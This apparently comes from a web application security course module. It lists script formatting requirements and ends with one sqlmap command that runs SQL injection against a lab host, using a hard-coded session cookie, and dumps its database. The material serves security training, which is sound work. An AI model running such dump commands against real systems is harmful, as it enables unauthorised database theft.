Welcome to Web Application Security Module \o/

Requirements
General
All your scripts will be tested on Kali Linux 2023.3
All your scripts should be exactly two lines long ($ wc -l file should print 2)
You must substitute the IP range for $1.
All your files should end with a new line (Why?)
The first line of all your files should be exactly #!/bin/bash.
A README.md file, at the root of the folder of the project, is mandatory
Your code should use the Betty style. It will be checked using betty-style.pl and betty-doc.pl
All your files must be executable

sqlmap -u "http://web0x00.hbtn/ticket?id=9" --cookie="session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.Z4BojQ.Hek5BhofOZUbW9No8AdLR5kweLw" --batch --dump
